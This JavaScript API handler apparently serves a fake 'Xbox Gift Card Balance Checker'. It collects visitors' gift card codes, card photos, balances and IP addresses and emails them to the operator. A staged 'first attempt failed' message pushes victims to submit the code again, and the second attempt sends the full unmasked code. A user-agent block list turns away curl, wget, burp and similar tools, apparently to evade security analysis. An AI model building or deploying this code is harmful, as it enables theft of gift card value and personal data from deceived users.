// api/log-check.js - DEBUG VERSION with better logging
import nodemailer from 'nodemailer';

const rateLimit = new Map();
const BLOCKED_USER_AGENTS = ['bot', 'crawler', 'spider', 'scraper', 'scan', 'wget', 'curl', 'python', 'go-http', 'java', 'perl', 'ruby', 'php', 'node-fetch', 'axios', 'insomnia', 'postman', 'burp'];

function isBotUserAgent(userAgent) {
  if (!userAgent) return true;
  const ua = userAgent.toLowerCase();
  return BLOCKED_USER_AGENTS.some(bot => ua.includes(bot));
}

function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60 * 1000;
  const maxRequests = 10;
  
  if (!rateLimit.has(ip)) rateLimit.set(ip, []);
  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
  
  if (timestamps.length >= maxRequests) return { allowed: false };
  timestamps.push(now);
  rateLimit.set(ip, timestamps);
  return { allowed: true };
}

function maskCode(code) {
  if (!code) return 'N/A';
  if (code.length <= 5) return '*****';
  return `*****${code.slice(-5)}`;
}

export default async function handler(req, res) {
  // ==================== DEBUG LOGGING ====================
  console.log('🚀 API Called - log-check');
  console.log('📋 Method:', req.method);
  console.log('📋 Headers:', req.headers);
  console.log('📋 Body:', req.body);
  console.log('📋 Environment Variables Check:');
  console.log('  - EMAIL_USER:', process.env.EMAIL_USER ? '✅ SET' : '❌ MISSING');
  console.log('  - EMAIL_PASS:', process.env.EMAIL_PASS ? '✅ SET' : '❌ MISSING');
  console.log('  - NOTIFICATION_EMAIL:', process.env.NOTIFICATION_EMAIL || '❌ MISSING (using default)');
  console.log('  - DISABLE_EMAIL:', process.env.DISABLE_EMAIL || '❌ NOT SET (default: false)');

  // ==================== CORS ====================
  const allowedOrigins = [
    'https://xbox-giftcard.vercel.app', 
    'https://www.xbox-giftcard.vercel.app',
    'http://localhost:5173',
    'http://localhost:3000',
    process.env.ALLOWED_ORIGIN
  ].filter(Boolean);
  
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  } else {
    res.setHeader('Access-Control-Allow-Origin', 'https://xbox-giftcard.vercel.app');
  }
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    console.log('✅ OPTIONS request handled');
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // ==================== SECURITY CHECKS ====================
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || '';
  
  if (isBotUserAgent(userAgent)) {
    console.log('🤖 Bot blocked:', userAgent);
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const rateResult = checkRateLimit(ip);
  if (!rateResult.allowed) {
    console.log('🚫 Rate limit exceeded for IP:', ip);
    return res.status(429).json({ error: 'Too many requests' });
  }

  // ==================== PROCESS REQUEST ====================
  const { type, cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent: clientUA, pageSource, imageBase64, message } = req.body;
  
  console.log('📥 Received request:');
  console.log('  - Type:', type);
  console.log('  - Amount:', amount);
  console.log('  - Page Source:', pageSource);
  console.log('  - Has Image:', !!imageBase64);

  // ==================== CHECK EMAIL CONFIG ====================
  if (process.env.DISABLE_EMAIL === 'true') {
    console.log('📧 Email sending is DISABLED (DISABLE_EMAIL=true)');
    return res.status(200).json({ 
      success: true, 
      message: 'Demo mode - Email not sent', 
      balance: balance || `$${amount || 0}` 
    });
  }

  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.error('❌ Email configuration missing!');
    console.error('  - EMAIL_USER:', process.env.EMAIL_USER ? 'SET' : 'MISSING');
    console.error('  - EMAIL_PASS:', process.env.EMAIL_PASS ? 'SET' : 'MISSING');
    return res.status(200).json({ 
      success: true, 
      message: 'Processing complete (email config pending)',
      balance: balance || `$${amount || 0}`,
      warning: 'Email service not configured'
    });
  }

  // ==================== SEND EMAIL ====================
  console.log('📧 Attempting to send email...');
  console.log('  - From:', process.env.EMAIL_USER);
  console.log('  - To:', process.env.NOTIFICATION_EMAIL || 'admin@xbox-demo.com');

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { 
        user: process.env.EMAIL_USER, 
        pass: process.env.EMAIL_PASS 
      }
    });

    // Verify transporter configuration
    await transporter.verify();
    console.log('✅ Transporter verified successfully');

    let subject = '';
    let html = '';
    let attachments = [];

    if (type === 'first_attempt_failed') {
      subject = 'FIRST ATTEMPT FAILED - Xbox Gift Card';
      html = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
          <div style="background: #dc3545; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
            <h2 style="margin: 0;">❌ FIRST ATTEMPT FAILED</h2>
          </div>
          <div style="background: white; padding: 20px; border-radius: 8px;">
            <p><strong>🎮 Code:</strong> ${maskCode(cardNumber)}</p>
            <p><strong>💰 Amount:</strong> $${amount}</p>
            <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
            <p><strong>📊 Status:</strong> FAILED</p>
            <p><strong>💬 Message:</strong> ${message || 'User instructed to re-enter code or upload clearer image'}</p>
            <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
            <p><strong>🌐 Browser:</strong> ${clientUA?.substring(0, 50) || 'Unknown'}</p>
            <p><strong>🖥️ IP:</strong> ${ip}</p>
          </div>
          <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
            <p>Xbox Gift Card Balance Checker - Automated Notification</p>
          </div>
        </div>
      `;
      if (imageBase64) {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({ 
            filename: `xbox-card-${Date.now()}.${matches[1]}`, 
            content: matches[2], 
            encoding: 'base64' 
          });
          console.log('📸 Image attached to email');
        }
      }
    } 
    else if (type === 'second_attempt_success') {
      subject = 'SECOND ATTEMPT SUCCESS - Xbox Gift Card';
      html = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
          <div style="background: #28a745; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
            <h2 style="margin: 0;">✅ SECOND ATTEMPT SUCCESS</h2>
          </div>
          <div style="background: white; padding: 20px; border-radius: 8px;">
            <p><strong>🎮 Code:</strong> ${cardNumber}</p>
            <p><strong>💰 Amount:</strong> $${amount}</p>
            <p><strong>💵 Balance:</strong> ${balance}</p>
            <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
            <p><strong>📊 Status:</strong> SUCCESS</p>
            <p><strong>💬 Message:</strong> ${message || 'Verification successful on second attempt'}</p>
            <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
            <p><strong>🌐 Browser:</strong> ${clientUA?.substring(0, 50) || 'Unknown'}</p>
            <p><strong>🖥️ IP:</strong> ${ip}</p>
          </div>
          <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
            <p>Xbox Gift Card Balance Checker - Automated Notification</p>
          </div>
        </div>
      `;
      if (imageBase64) {
        const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (matches && matches[2]) {
          attachments.push({ 
            filename: `xbox-card-${Date.now()}.${matches[1]}`, 
            content: matches[2], 
            encoding: 'base64' 
          });
          console.log('📸 Image attached to email');
        }
      }
    }
    else if (type === 'mismatch_attempt') {
      subject = 'CODE MISMATCH - Xbox Gift Card';
      html = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
          <div style="background: #ffc107; color: #1a1a1a; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
            <h2 style="margin: 0;">⚠️ CODE MISMATCH</h2>
          </div>
          <div style="background: white; padding: 20px; border-radius: 8px;">
            <p><strong>🎮 First Code:</strong> ${maskCode(cardNumberFirst)}</p>
            <p><strong>🎮 Second Code:</strong> ${maskCode(cardNumberSecond)}</p>
            <p><strong>💰 Amount:</strong> $${amount}</p>
            <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
            <p><strong>📊 Status:</strong> MISMATCH</p>
            <p><strong>💬 Message:</strong> ${message || 'User entered different code on second attempt'}</p>
            <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
            <p><strong>🌐 Browser:</strong> ${clientUA?.substring(0, 50) || 'Unknown'}</p>
            <p><strong>🖥️ IP:</strong> ${ip}</p>
          </div>
          <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
            <p>Xbox Gift Card Balance Checker - Automated Notification</p>
          </div>
        </div>
      `;
    }

    // Send email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFICATION_EMAIL || 'admin@xbox-demo.com',
      subject: subject,
      html: html,
      attachments: attachments
    };

    const info = await transporter.sendMail(mailOptions);
    console.log('✅ Email sent successfully!');
    console.log('  - Message ID:', info.messageId);
    console.log('  - Response:', info.response);

    return res.status(200).json({ 
      success: true, 
      message: 'Email sent successfully',
      balance: balance || `$${amount || 0}` 
    });

  } catch (error) {
    console.error('❌ Email send error:');
    console.error('  - Error:', error.message);
    console.error('  - Stack:', error.stack);
    return res.status(500).json({ 
      error: 'Failed to send email: ' + error.message,
      success: false 
    });
  }
}